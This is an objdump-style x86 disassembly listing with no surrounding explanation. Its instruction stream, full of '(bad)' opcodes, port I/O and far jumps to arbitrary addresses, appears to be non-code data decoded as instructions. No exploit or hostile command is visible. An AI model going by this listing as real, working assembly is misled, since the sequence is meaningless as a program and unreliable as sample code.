  416cdd:	sub    eax,eax
  416cdf:	push   ecx
  416ce0:	out    0x4f,al
  416ce2:	dec    esp
  416ce3:	mov    bh,0x31
  416ce5:	xor    DWORD PTR [ebp-0x7d],edx
  416ce8:	sbb    ebp,DWORD PTR [edi]
  416cea:	lahf   
  416ceb:	sahf   
  416cec:	sub    DWORD PTR [esi],0xce827fe2
  416cf2:	push   esi
  416cf3:	xor    edi,DWORD PTR [esi]
  416cf5:	mov    edi,0xc7b060b0
  416cfa:	xor    al,0x11
  416cfc:	addr16 jp 0x416d2a
  416cff:	lods   eax,DWORD PTR ds:[esi]
  416d00:	pop    esp
  416d01:	out    dx,eax
  416d02:	adc    eax,0x459cabde
  416d07:	xor    al,0xc0
  416d09:	dec    esp
  416d0a:	push   ss
  416d0b:	mov    ah,0x75
  416d0d:	shl    BYTE PTR [eax+0x72],1
	...
  416d74:	and    DWORD PTR [ebx-0x40445077],edx
  416d7a:	daa    
  416d7b:	lahf   
  416d7c:	mov    ch,0x99
  416d7e:	pop    edx
  416d7f:	das    
  416d80:	xlat   BYTE PTR ds:[ebx]
  416d81:	(bad)  
  416d82:	adc    eax,0xf158f9
  416d87:	add    BYTE PTR [ecx+eax*1],al
  416d8a:	add    BYTE PTR [eax],al
  416d8c:	sbb    eax,0x92fbe8f3
  416d91:	in     al,dx
  416d92:	stos   DWORD PTR es:[edi],eax
  416d93:	ja     0x416d9b
  416d95:	test   BYTE PTR [eax+0x7c84909d],bl
  416d9b:	xor    esp,edi
  416d9d:	aad    0x0
  416d9f:	jg     0x416d5d
  416da1:	or     cl,BYTE PTR [ebp+edx*1-0x57]
  416da5:	add    al,0x21
  416da7:	lods   eax,DWORD PTR ds:[esi]
  416da8:	popa   
  416da9:	jecxz  0x416e1b
  416dab:	sbb    ecx,DWORD PTR [ebx+0x70169ccc]
  416db1:	imul   BYTE PTR [ecx-0x5fc6986d]
  416db7:	pop    esp
  416db8:	mov    edx,0x676e98ce
  416dbd:	out    dx,eax
  416dbe:	inc    esp
  416dbf:	cld    
  416dc0:	inc    edi
  416dc1:	push   ss
  416dc2:	or     ebx,DWORD PTR [esi-0x6d]
  416dc5:	mov    ch,0x1c
  416dc7:	add    ebx,DWORD PTR [edx-0x35872a31]
  416dcd:	in     eax,0x7b
  416dcf:	push   esp
  416dd0:	dec    ebx
  416dd1:	mov    gs,WORD PTR [ebx+edi*8]
  416dd4:	xor    edx,DWORD PTR [esi+0x5e]
  416dd7:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416dd9:	sbb    al,BYTE PTR [edi+0x1562ef89]
  416ddf:	in     al,dx
  416de0:	mov    bh,0x79
  416de2:	lahf   
  416de3:	push   ss
  416de4:	mov    cl,0x8b
  416de6:	dec    ecx
  416de7:	jmp    0x416e37
  416de9:	mov    al,0x98
  416deb:	dec    ebx
  416dec:	pop    ebp
  416ded:	les    edi,FWORD PTR [esi]
  416def:	sbb    edi,esp
  416df1:	sbb    BYTE PTR [ebx-0x5],ch
  416df4:	push   0xffffffe5
  416df6:	test   eax,0xd995dbee
  416dfb:	mov    bl,0x2e
  416dfd:	bound  edi,QWORD PTR [eax-0x1c]
  416e00:	or     edi,0x5a4a6aca
  416e06:	mov    dl,0x68
  416e08:	sub    BYTE PTR [eax],bl
  416e0a:	mov    cl,0x11
  416e0c:	int    0x92
  416e0e:	stos   DWORD PTR es:[edi],eax
  416e0f:	mov    al,BYTE PTR [edx+0xb]
  416e12:	mov    al,0x6c
  416e14:	stos   DWORD PTR es:[edi],eax
  416e15:	inc    esi
  416e16:	xchg   ecx,eax
  416e17:	addr16 cs das 
  416e1a:	xor    bl,BYTE PTR [ebx+0x19]
  416e1d:	shr    BYTE PTR [eax],cl
  416e1f:	jbe    0x416e47
  416e21:	(bad)
  416e24:	push   eax
  416e25:	inc    ebx
  416e26:	imul   edi,DWORD PTR [esi],0xb7e635d2
  416e2c:	sub    al,0xb2
  416e2e:	mov    esi,0xabfa0470
  416e33:	loopne 0x416ea1
  416e35:	stos   BYTE PTR es:[edi],al
  416e36:	mov    eax,ds:0x9b8c91f1
  416e3b:	sub    ah,BYTE PTR [esi-0x37d76784]
  416e41:	test   DWORD PTR [ebx+0x6e16135e],esp
  416e47:	xchg   edx,eax
  416e48:	pop    ss
  416e49:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416e4a:	dec    ebx
  416e4b:	mov    ch,0x94
  416e4d:	pop    esi
  416e4e:	add    dh,BYTE PTR ds:0x5391a240
  416e54:	inc    ecx
  416e55:	inc    ecx
  416e56:	cmp    ebx,DWORD PTR [ebp+0x31efc787]
  416e5c:	in     eax,dx
  416e5d:	adc    DWORD PTR [ebp+ecx*2-0x60],esi
  416e61:	or     BYTE PTR [ecx-0x356b0f98],0xef
  416e68:	and    BYTE PTR [ecx-0x1c6baabd],0xb6
  416e6f:	jmp    0x2a917230
  416e74:	mov    edi,0x798b9fab
  416e79:	xor    esp,DWORD PTR [ebx]
  416e7b:	add    eax,0x75a2101d
  416e80:	dec    ecx
  416e81:	push   0x7a273cda
  416e86:	dec    esi
  416e87:	inc    esi
  416e88:	or     al,0x4f
  416e8a:	fs dec esi
  416e8c:	cmp    esi,DWORD PTR [edi]
  416e8e:	(bad)  
  416e8f:	cli    
	...
  416ef4:	mov    edi,0xae6d8e19
  416ef9:	(bad)  
  416efa:	(bad)  
  416efb:	fucomi st,st(0)
  416efd:	xor    eax,0xcb9f8eea
  416f02:	inc    edx
  416f03:	mov    esp,0xf25c
  416f08:	add    al,0x1
  416f0a:	add    BYTE PTR [eax],al
  416f0c:	xchg   eax,ecx
  416f0e:	das    
  416f0f:	jl     0x416eef
  416f11:	mov    edi,0x643c8597
  416f16:	xchg   esi,eax
  416f17:	scas   al,BYTE PTR es:[edi]
  416f18:	mov    esi,0xc3075a5f
  416f1d:	sar    dl,1
  416f1f:	jg     0x416f9c
  416f21:	sub    DWORD PTR gs:[eax+0x7d50db00],0xfffffff4
  416f29:	in     eax,0xc7
  416f2b:	xchg   edi,eax
  416f2c:	adc    BYTE PTR [ebp-0x60],dh
  416f2f:	(bad)  
  416f30:	(bad)  
  416f31:	jae    0x416ebd
  416f33:	fdivr  DWORD PTR [ecx+0x2c3bb968]
  416f39:	shl    DWORD PTR [edi],0xaa
  416f3c:	mov    dl,0xf4
  416f3e:	mov    esi,0x3284da86
  416f43:	enter  0x47c5,0x6a
  416f47:	aam    0x82
  416f49:	or     al,0x97
  416f4b:	cmp    DWORD PTR [edi-0x6c],ebx
  416f4e:	dec    esp
  416f4f:	js     0x416f66
  416f51:	cwde   
  416f52:	repnz fnsave [esi+ebx*4]
  416f56:	adc    al,0x3b
  416f58:	and    BYTE PTR [edi+0x6c],0x65
  416f5c:	xchg   edi,eax
  416f5d:	and    edx,DWORD PTR [ebp+0x7863f19d]
  416f63:	adc    ch,BYTE PTR [edx-0x64]
  416f66:	add    DWORD PTR [esp+ebp*8-0x2b],esi
  416f6a:	xor    al,0xf6
  416f6c:	mov    WORD PTR [ebp-0x3b008141],?
  416f72:	imul   ebx,DWORD PTR [ecx-0x3b],0x28
  416f76:	lock test eax,0x2ba5f10e
  416f7c:	sar    DWORD PTR [ecx+0x3eb08981],1
  416f82:	retf   
  416f83:	div    BYTE PTR [esi]
  416f85:	(bad)  
  416f86:	lock (bad) 
  416f88:	cmc    
  416f89:	xchg   esp,eax
  416f8a:	jnp    0x416fbf
  416f8c:	clc    
  416f8d:	adc    al,0x44
  416f8f:	jg     0x416fed
  416f91:	pop    ebp
  416f92:	mov    DWORD PTR [ebp-0x34],ebp
  416f95:	das    
  416f96:	test   al,0x11
  416f98:	fcomi  st,st(6)
  416f9a:	inc    esp
  416f9b:	mov    edx,0x80dd385
  416fa0:	mov    ah,0x3e
  416fa2:	jnp    0x416f89
  416fa4:	jne    0x416f6a
  416fa6:	mov    ebx,0xa4795fae
  416fab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416fac:	retf   
  416fad:	pop    esp
  416fae:	fwait
  416faf:	xchg   esi,eax
  416fb0:	add    esi,esp
  416fb2:	fwait
  416fb3:	mov    ch,0x1b
  416fb5:	rdpmc  
  416fb7:	repnz ins DWORD PTR es:[edi],dx
  416fb9:	in     eax,dx
  416fba:	mov    edi,0xd37a771e
  416fbf:	int3   
  416fc0:	ret    0xd15e
  416fc3:	outs   dx,DWORD PTR ds:[esi]
  416fc4:	ins    DWORD PTR es:[edi],dx
  416fc5:	inc    edi
  416fc6:	loop   0x416f79
  416fc8:	mov    ebx,0x8e1c4bae
  416fcd:	add    dh,BYTE PTR [edx]
  416fcf:	loope  0x416f72
  416fd1:	cmc    
  416fd2:	in     eax,dx
  416fd3:	xchg   edi,eax
  416fd4:	hlt    
  416fd5:	scas   eax,DWORD PTR es:[edi]
  416fd6:	sbb    al,0x8e
  416fd8:	pusha  
  416fd9:	sbb    esi,edx
  416fdb:	arpl   bx,di
  416fdd:	cmp    al,0x2a
  416fdf:	cwde   
  416fe0:	dec    esp
  416fe1:	inc    edi
  416fe2:	mov    eax,ds:0x67ad43e5
  416fe7:	imul   esi,DWORD PTR [edx+0x4b],0xfffffffe
  416feb:	jp     0x416fca
  416fed:	and    cl,cl
  416fef:	iret   
  416ff0:	lock push 0x9609d812
  416ff6:	in     eax,0x1c
  416ff8:	das    
  416ff9:	push   ebx
  416ffa:	add    eax,0x64cda8de
  416fff:	repz mov bh,0xe8
  417002:	fcomp  DWORD PTR [ecx+ebp*1-0x27]
  417006:	or     al,0x11
  417008:	xor    al,BYTE PTR [eax]
  41700a:	jo     0x416fef
  41700c:	call   0x0:0x377689
	...
  417073:	add    BYTE PTR [esi+0x2d],dh
  417076:	push   ebp
  417077:	inc    ecx
  417078:	pop    edi
  417079:	jns    0x4170f1
  41707b:	aas    
  41707c:	(bad)  
  41707d:	loopne 0x417073
  41707f:	sub    ebx,eax
  417081:	xor    al,0xe5
  417083:	fsub   QWORD PTR [eax-0xd]
  417086:	add    BYTE PTR [eax],al
  417088:	add    al,0x1
  41708a:	add    BYTE PTR [eax],al
  41708c:	jle    0x4170eb
  41708e:	xor    BYTE PTR [esi*8+0x4adab0a1],dh
  417095:	xor    DWORD PTR [edi+0x1cb7faf0],ebx
  41709b:	ins    BYTE PTR es:[edi],dx
  41709c:	lock cld 
  41709e:	icebp  
  41709f:	push   ecx
  4170a0:	pop    ecx
  4170a1:	inc    ecx
  4170a2:	add    bl,BYTE PTR [edx]
  4170a4:	mov    dh,0x8e
  4170a6:	mov    edi,0xfffa5aae
  4170ab:	retf   0xeecf
  4170ae:	cmp    bh,al
  4170b0:	sbb    esi,esi
  4170b2:	xchg   BYTE PTR [edi-0x3560268],ah
  4170b8:	je     0x417136
  4170ba:	xchg   esp,eax
  4170bb:	sub    DWORD PTR [edx+0x1],edx
  4170be:	sbb    eax,0x603c26e9
  4170c3:	out    0xcd,eax
  4170c5:	or     DWORD PTR [ecx-0x36],0xa1d46e15
  4170cc:	into   
  4170cd:	sbb    esi,eax
  4170cf:	(bad)  
  4170d0:	pushf  
  4170d1:	scas   al,BYTE PTR es:[edi]
  4170d2:	sbb    esp,DWORD PTR [ebp-0x77c81f6]
  4170d8:	out    0xb3,al
  4170da:	fnsave [edi]
  4170dc:	fild   WORD PTR [edi+0x760f5be3]
  4170e2:	retf   
  4170e3:	dec    edx
  4170e4:	dec    esi
  4170e5:	out    dx,eax
  4170e6:	xchg   esi,eax
  4170e7:	data16 xcrypt-cfb (bad)
  4170e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4170ea:	fs cmc 
  4170ec:	pop    es
  4170ed:	scas   eax,DWORD PTR es:[edi]
  4170ee:	pop    eax
  4170ef:	cmp    eax,0x3fe5cffd
  4170f4:	xor    dh,BYTE PTR [ebp+0x5bd5a5fb]
  4170fa:	pop    ebp
  4170fb:	mov    esi,0xb3ded8c9
  417100:	mov    al,0x7a
  417102:	not    DWORD PTR [edi+eax*1]
  417105:	add    eax,0xbab94f51
  41710a:	(bad)  
  41710b:	push   esi
  41710c:	test   DWORD PTR [edx+0x799d3d65],ebx
  417112:	mov    esp,0xcc18bbde
  417117:	mov    ah,0x8
  417119:	cli    
  41711a:	xchg   esp,eax
  41711b:	xor    cl,0x2d
  41711e:	pop    ebx
  41711f:	lds    ebp,FWORD PTR [esp+esi*4+0x16f85a8f]
  417126:	in     al,dx
  417127:	in     eax,dx
  417128:	mov    bl,0xf7
  41712a:	cmp    al,0x2c
  41712c:	jecxz  0x41719b
  41712e:	pop    ecx
  41712f:	aam    0xe1
  417131:	pop    esp
  417132:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417133:	mov    ds:0xa24180cc,eax
  417138:	mov    ah,BYTE PTR [ecx]
  41713a:	cmc    
  41713b:	mov    edx,0x35ff818f
  417140:	and    eax,0xd1808ce
  417145:	ds jbe 0x417177
  417148:	pop    esi
  417149:	xor    edi,0x1d
  41714c:	sahf   
  41714d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41714e:	xchg   DWORD PTR [edi-0x6663d17b],eax
  417154:	pop    ds
  417155:	popf   
  417156:	add    BYTE PTR [ecx-0x15],bh
  417159:	es (bad) 
  41715b:	(bad)  
  41715d:	lock or dl,BYTE PTR [edi]
  417160:	or     eax,0x66e2567d
  417165:	hlt    
  417166:	xor    BYTE PTR [eax+0x24],ch
  417169:	aam    0x47
  41716b:	ror    BYTE PTR [ecx],cl
  41716d:	adc    ah,BYTE PTR [edi+eiz*8-0x79]
  417171:	jo     0x417131
  417173:	pop    ecx
  417174:	push   0x1f15d791
  417179:	or     al,0xe1
  41717b:	mov    BYTE PTR [ecx],ch
  41717d:	(bad)  
  41717f:	add    edx,DWORD PTR [ebp-0x57f4956c]
  417185:	loope  0x41712c
  417187:	add    cl,al
  417189:	(bad)
  41718c:	retf   0xa9c3
  41718f:	pop    ecx
	...
  4171f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4171f5:	sbb    DWORD PTR [eax+0x1a],esi
  4171f8:	(bad)  
  4171f9:	jnp    0x4171e9
  4171fb:	mov    ebp,0x986526a4
  417200:	(bad)  
  417202:	push   ebx
  417203:	scas   al,BYTE PTR es:[edi]
  417204:	fs hlt 
  417206:	add    BYTE PTR [eax],al
  417208:	add    al,0x1
  41720a:	add    BYTE PTR [eax],al
  41720c:	in     al,0xe3
  41720e:	sbb    al,BYTE PTR [ebx-0x3c3c5e1f]
  417214:	call   0xfb2db35b
  417219:	call   0x27473e6b
  41721e:	fild   WORD PTR [ebx-0x5f289c94]
  417224:	loop   0x417241
  417226:	push   eax
  417227:	adc    dh,BYTE PTR [ebx]
  417229:	loopne 0x417251
  41722b:	xor    eax,DWORD PTR [ecx-0x24a2bb70]
  417231:	dec    edi
  417232:	rep ins DWORD PTR es:[edi],dx
  417234:	imul   esp,DWORD PTR [edi+0x61],0xffffff9d
  417238:	xor    al,0xc3
  41723a:	pop    ebx
  41723b:	xchg   ebx,eax
  41723c:	sub    ecx,ecx
  41723e:	push   cs
  41723f:	xchg   ebx,eax
  417240:	shl    BYTE PTR [edx+edi*4-0x66735c],1
  417247:	jecxz  0x41721c
  417249:	xchg   esp,eax
  41724a:	gs jne 0x41729b
  41724d:	mov    ds,WORD PTR [esp+edx*8-0x25]
  417251:	push   eax
  417252:	sbb    ecx,DWORD PTR [eax-0x5f]
  417255:	sbb    ah,BYTE PTR [ebp-0x52]
  417258:	mov    ds:0xe3ec2d79,eax
  41725d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41725e:	outs   dx,DWORD PTR ds:[esi]
  41725f:	gs cmp BYTE PTR es:[eax],al
  417263:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417264:	inc    ebx
  417265:	aam    0xe2
  417267:	or     bl,bh
  417269:	call   0xa51e:0x3eaa1c7d
  417270:	pop    ss
  417271:	or     BYTE PTR [eax-0x49e48f83],bh
  417277:	icebp  
  417278:	mov    ebp,0xb5b74726
  41727d:	mov    DWORD PTR [ecx-0xeafe669],esi
  417283:	test   BYTE PTR [eax+0x59eeaca8],bl
  417289:	pop    ebp
  41728a:	dec    esp
  41728b:	dec    edx
  41728c:	shl    DWORD PTR [ecx],0x36
  41728f:	aas    
  417290:	xchg   esp,eax
  417291:	mov    WORD PTR [ebx],ds
  417293:	cmp    al,0x70
  417295:	adc    al,0xc0
  417297:	pop    ecx
  417298:	jp     0x417318
  41729a:	inc    ecx
  41729b:	adc    al,0x10
  41729d:	enter  0x264a,0xd7
  4172a1:	loope  0x4172ee
  4172a3:	sbb    BYTE PTR [ecx+0x1e],dl
  4172a6:	mov    eax,ds:0xf5da9f48
  4172ab:	pop    es
  4172ac:	cmc    
  4172ad:	hlt    
  4172ae:	aas    
  4172af:	pop    esp
  4172b0:	sbb    DWORD PTR [edi+0x2614e30e],0x6220650b
  4172ba:	mov    dh,BYTE PTR [esi-0x48d9ede3]
  4172c0:	fcom   st(5)
  4172c2:	cmp    dh,BYTE PTR [ebx+0x6f]
  4172c5:	ror    BYTE PTR [esp+ebp*2-0x7a],cl
  4172c9:	and    eax,0xadb35f50
  4172ce:	pusha  
  4172cf:	test   DWORD PTR [eax],esp
  4172d1:	loopne 0x4172e1
  4172d3:	es pop esp
  4172d5:	pop    edx
  4172d6:	mov    ds:0x306cac9f,al
  4172db:	xor    BYTE PTR [ecx-0x38],0x49
  4172df:	jl     0x41731a
  4172e1:	mov    ebp,0xc388c60a
  4172e6:	push   cs
  4172e7:	mov    al,ds:0x650fe9c0
  4172ec:	cmc    
  4172ed:	addr16 inc esi
  4172ef:	mov    ecx,0xba4185b3
  4172f4:	pop    ebx
  4172f5:	dec    eax
  4172f6:	call   0x5bfaa5e0
  4172fb:	inc    ecx
  4172fc:	shl    DWORD PTR [edi],0xb9
  4172ff:	(bad)  
  417300:	pop    esi
  417301:	lods   eax,DWORD PTR ds:[esi]
  417302:	push   0x38
  417304:	test   DWORD PTR ds:0x1c026707,ebp
  41730a:	dec    edx
  41730b:	sub    al,0x38
  41730d:	dec    eax
  41730e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41730f:	mov    ch,0x0
	...
  417371:	add    BYTE PTR [eax],al
  417373:	add    BYTE PTR [ecx-0x44],ch
  417376:	xlat   BYTE PTR ds:[ebx]
  417377:	pop    esi
  417378:	xlat   BYTE PTR ds:[ebx]
  417379:	jg     0x417364
  41737b:	mov    edi,0x6508016b
  417380:	jle    0x41735f
  417382:	ds xchg edi,eax
  417384:	push   0x40000f5
  417389:	add    DWORD PTR [eax],eax
  41738b:	add    BYTE PTR [esp+esi*4-0x16],ch
  41738f:	int3   
  417390:	int3   
  417391:	mov    ebx,DWORD PTR [ebx]
  417393:	add    al,0xc9
  417395:	(bad)  
  417396:	jae    0x41735c
  417398:	xor    ebx,DWORD PTR [ebx+0x16]
  41739b:	mov    al,ss:0x770282a9
  4173a1:	lahf   
  4173a2:	and    cl,BYTE PTR [eax-0x26c80e6d]
  4173a8:	inc    ecx
  4173a9:	jge    0x4173bb
  4173ab:	jnp    0x417413
  4173ad:	mov    bl,bl
  4173af:	arpl   WORD PTR [eax-0x754facda],cx
  4173b5:	es jmp 0x42e0:0x14faa624
  4173bd:	and    eax,0x30a65ef0
  4173c2:	pop    es
  4173c3:	shr    ch,0x7b
  4173c6:	push   esp
  4173c7:	adc    eax,0x25699ace
  4173cc:	and    bl,BYTE PTR [eax]
  4173ce:	daa    
  4173cf:	mov    ecx,ebx
  4173d1:	or     ebp,DWORD PTR [ecx]
  4173d3:	add    al,0xee
  4173d5:	(bad)  
  4173d6:	jns    0x41743d
  4173d8:	imul   edi,DWORD PTR [ecx],0x74
  4173db:	hlt    
  4173dc:	mov    eax,ds:0xcef6f541
  4173e1:	or     al,0x56
  4173e3:	jg     0x4173b9
  4173e5:	enter  0xc478,0xbd
  4173e9:	jl     0x417410
  4173eb:	inc    esp
  4173ec:	not    eax
  4173ee:	xor    eax,0x538527cb
  4173f3:	sbb    BYTE PTR [ebx+eax*2],dh
  4173f6:	lahf   
  4173f7:	(bad)  
  4173f8:	lods   al,BYTE PTR ds:[esi]
  4173f9:	jnp    0x417408
  4173fb:	das    
  4173fc:	xor    bl,bh
  4173fe:	je     0x417467
  417400:	pop    es
  417401:	fs retf 
  417403:	dec    ebx
  417404:	pop    ds
  417405:	lods   al,BYTE PTR ds:[esi]
  417406:	lds    eax,FWORD PTR [edi]
  417408:	sub    al,0x5c
  41740a:	sar    DWORD PTR [ebx+edx*1+0x4d],0xf1
  41740f:	jmp    DWORD PTR [esi+0x12]
  417412:	aad    0xf2
  417414:	push   0x7a
  417416:	shr    dh,0xb4
  417419:	dec    ecx
  41741a:	push   edx
  41741b:	xor    ebp,esp
  41741d:	shr    BYTE PTR [edi],cl
  41741f:	inc    ebx
  417420:	sub    DWORD PTR [edx],esi
  417422:	inc    ecx
  417423:	mov    dh,0x8c
  417425:	inc    esp
  417426:	cmc    
  417427:	bound  ebx,QWORD PTR [ebx-0x9]
  41742a:	lods   al,BYTE PTR ds:[esi]
  41742c:	int3   
  41742d:	inc    edx
  41742e:	outs   dx,BYTE PTR ds:[esi]
  41742f:	call   0x38db:0xc649993d
  417436:	or     al,bh
  417438:	or     eax,0xc0011a45
  41743d:	sub    esp,DWORD PTR [esi]
  41743f:	mov    ss,WORD PTR [edi]
  417441:	cdq    
  417442:	mov    al,0x94
  417444:	adc    edx,ebx
  417446:	stos   BYTE PTR es:[edi],al
  417447:	adc    BYTE PTR [ebp-0xd],dh
  41744a:	retf   0xdf50
  41744d:	popa   
  41744e:	daa    
  41744f:	je     0x4173e8
  417451:	loope  0x41743f
  417453:	call   0x1774:0xfab77d5b
  41745a:	xchg   esi,eax
  41745b:	cmp    dl,BYTE PTR [edi]
  41745d:	test   al,0xb4
  41745f:	push   edi
  417460:	mov    edx,0x19c48213
  417465:	sbb    ch,bh
  417467:	or     BYTE PTR [eax+ebx*1+0x4dab7b3c],al
  41746e:	add    BYTE PTR [ecx-0x23],0xc9
  417472:	mov    ecx,DWORD PTR [esi-0x6b]
  417475:	mov    ebp,0xc95114bd
  41747a:	lahf   
  41747b:	xlat   BYTE PTR ds:[ebx]
  41747c:	mov    al,0xa2
  41747e:	dec    ecx
  41747f:	pop    edx
  417480:	xor    bh,dh
  417482:	and    BYTE PTR [esi],dl
  417484:	xor    al,0x6d
  417486:	adc    DWORD PTR [esi+0x3c],0xd974f378
  41748d:	push   esp
  41748e:	xchg   ebx,eax
  41748f:	add    DWORD PTR [eax],eax
	...
  4174f1:	add    BYTE PTR [eax],al
  4174f3:	add    BYTE PTR [ecx+0x6b0c6aba],dl
  4174f9:	fdivr  st(7),st
  4174fb:	mov    edi,0x212a686b
  417500:	add    ebx,DWORD PTR [ebx]
  417502:	dec    ebx
  417503:	pop    ebp
  417504:	ins    BYTE PTR es:[edi],dx
  417505:	test   BYTE PTR [eax],0x0
  417508:	add    al,0x1
  41750a:	add    BYTE PTR [eax],al
  41750c:	rol    BYTE PTR [eax-0x20],1
  41750f:	cs push bx
  417512:	xchg   ecx,eax
  417513:	xor    ah,bl
  417515:	retf   0x269f
  417518:	addr16 mov esi,0x15d6f336
  41751e:	arpl   WORD PTR [edx+edx*8],si
  417521:	je     0x4174eb
  417523:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417524:	pusha  
  417525:	rol    esi,cl
  417527:	lea    esi,[edx-0x1e188703]
  41752d:	outs   dx,DWORD PTR ds:[esi]
  41752e:	ret    0xabd3
  417531:	jp     0x417542
  417533:	adc    ecx,ebx
  417535:	jnp    0x417558
  417537:	mov    ds,WORD PTR [ebp+0x37730a47]
  41753d:	xchg   DWORD PTR [ecx],esp
  41753f:	and    esp,eax
  417541:	jne    0x4174e0
  417543:	inc    ebx
  417544:	cmp    bh,BYTE PTR [edi]
  417546:	or     ebp,esi
  417548:	xor    edx,edx
  41754a:	stc    
  41754b:	sub    ecx,DWORD PTR [eax-0x2d53d1ad]
  417551:	or     dh,0x30
  417554:	dec    edi
  417555:	jp     0x41750c
  417557:	inc    ecx
  417558:	pop    ds
  417559:	xchg   ch,dl
  41755b:	sbb    DWORD PTR ds:0x4c577f5a,esp
  417561:	pop    ds
  417562:	cmp    esi,ebx
  417564:	in     eax,dx
  417565:	inc    ebx
  417566:	push   ebx
  417567:	aad    0xc
  417569:	sub    eax,eax
  41756b:	clc    
  41756c:	(bad)  
  41756d:	loope  0x417529
  41756f:	xor    DWORD PTR [edi+0x1b],ebp
  417572:	inc    ebp
  417573:	sti    
  417574:	ja     0x4175c4
  417576:	mov    DWORD PTR [esi+0x2b3c2b2f],ecx
  41757c:	or     al,0xe6
  41757e:	jmp    0x41754e
  417580:	xrelease mov DWORD PTR [edx-0x61],esp
  417584:	xchg   ecx,eax
  417585:	bound  esi,QWORD PTR [eax-0x2]
  417588:	das    
  417589:	pop    esp
  41758a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41758b:	adc    al,0xc
  41758d:	jge    0x417579
  41758f:	gs add ebp,esp
  417592:	sbb    al,0xb6
  417594:	loop   0x417546
  417596:	repz iret 
  417598:	pop    edi
  417599:	cmp    cl,ah
  41759b:	fnstsw WORD PTR [edi-0x3b9749f7]
  4175a1:	xchg   ebx,eax
  4175a2:	xor    al,0x6e
  4175a4:	adc    DWORD PTR [edi+0x3ada5fbc],ecx
  4175aa:	pop    ecx
  4175ab:	mov    al,ds:0xcc7d7bed
  4175b0:	(bad)  
  4175b1:	cdq    
  4175b2:	fbld   TBYTE PTR [edi-0x50eeb253]
  4175b8:	mov    al,ds:0x8ac72f37
  4175bd:	add    eax,0x7821cf67
  4175c2:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4175c4:	dec    esp
  4175c5:	push   ecx
  4175c6:	clc    
  4175c7:	pusha  
  4175c8:	mov    al,0x67
  4175ca:	jbe    0x41754e
  4175cc:	mov    bh,0x61
  4175ce:	inc    edx
  4175cf:	push   ebp
  4175d0:	or     al,BYTE PTR [edx]
  4175d2:	les    edx,FWORD PTR [edi+eiz*2+0x2fe5c097]
  4175d9:	test   ebx,eax
  4175db:	push   edi
  4175dc:	in     eax,dx
  4175dd:	outs   dx,DWORD PTR ds:[esi]
  4175de:	mov    eax,0x4f0448a0
  4175e3:	fdivp  st(7),st
  4175e5:	xchg   BYTE PTR [ecx],cl
  4175e7:	fcomp  QWORD PTR [edi+0x7f]
  4175ea:	add    DWORD PTR [ecx],0xb087d8ad
  4175f0:	dec    eax
  4175f1:	popf   
  4175f2:	fidivr WORD PTR [esi-0x79]
  4175f6:	jo     0x417615
  4175f8:	rol    ch,cl
  4175fa:	loope  0x417658
  4175fc:	or     ebp,DWORD PTR [esp+ebp*2-0x4162fed8]
  417603:	jge    0x41766d
  417605:	sbb    esi,DWORD PTR [eax-0x63]
  417608:	cmc    
  417609:	inc    ebp
  41760a:	cmp    bl,ah
  41760c:	(bad)  
  41760d:	cli    
  41760e:	adc    edi,eax
	...
  417674:	test   eax,0xdf4fd367
  417679:	(bad)  
  41767a:	mov    ebp,0x411f24e7
  41767f:	fisubr DWORD PTR [ecx]
  417681:	xchg   edx,eax
  417682:	int3   
  417683:	adc    al,0x70
  417685:	test   DWORD PTR [eax],0x10400
  41768b:	add    BYTE PTR [ebp+0x4f],cl
  41768e:	imul   esi,DWORD PTR [esi+0x49ca78bc],0xfffffff8
  417695:	shr    dh,0x7d
  417698:	sbb    esi,DWORD PTR [esi-0x4d844380]
  41769e:	sub    DWORD PTR [eax+0x2b],esp
  4176a1:	and    ebp,DWORD PTR [ebp+edx*4-0x36]
  4176a5:	cmp    cl,BYTE PTR [ecx+0x1ec8c6bb]
  4176ab:	sbb    ebx,DWORD PTR [esi+eiz*4-0x4a66c3e3]
  4176b2:	test   BYTE PTR [edx],bl
  4176b4:	in     al,0xe
  4176b6:	dec    esi
  4176b7:	scas   eax,DWORD PTR es:[edi]
  4176b8:	pop    ebp
  4176b9:	mov    ds:0x23aa6cc5,eax
  4176be:	pushf  
  4176bf:	aas    
  4176c0:	jns    0x417642
  4176c2:	pop    ebx
  4176c3:	out    0xcf,eax
  4176c5:	cmp    cl,BYTE PTR [ebx+0x63635f95]
  4176cb:	dec    ebp
  4176cc:	imul   esp,DWORD PTR [esi+0x49e39520],0x5aa35d5e
  4176d6:	jo     0x41767f
  4176d8:	in     al,dx
  4176d9:	stc    
  4176da:	mov    ecx,0x455005a2
  4176df:	ins    BYTE PTR es:[edi],dx
  4176e0:	daa    
  4176e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4176e2:	mov    BYTE PTR [ebx+0x52d9a15e],dl
  4176e8:	fst    DWORD PTR [ecx+0xd]
  4176eb:	dec    edi
  4176ec:	pop    esp
  4176ed:	and    al,0x7f
  4176ef:	add    al,0x2d
  4176f1:	call   0x9e97e3f2
  4176f6:	dec    ebp
  4176f7:	jecxz  0x417688
  4176f9:	dec    esi
  4176fa:	shl    DWORD PTR [esi-0x80],cl
  4176fd:	adc    al,BYTE PTR [ebx-0x6b]
  417700:	into   
  417701:	jl     0x4176d3
  417703:	mov    ebx,0xf046ff72
  417708:	cli    
  417709:	cs test ah,ah
  41770c:	mov    gs,WORD PTR [eax+0x57894fc3]
  417712:	in     al,dx
  417713:	imul   esp,esp,0x39
  417716:	jno    0x41770a
  417718:	out    0x80,eax
  41771a:	adc    DWORD PTR [eax],0xb
  41771d:	mov    ah,0xe5
  41771f:	gs pop edx
  417721:	mov    eax,0xf93d037b
  417726:	push   esp
  417727:	mov    ds:0x45349cc9,al
  41772c:	mov    ecx,0x8b1139e6
  417731:	mov    esi,0x3cedc0e1
  417736:	dec    eax
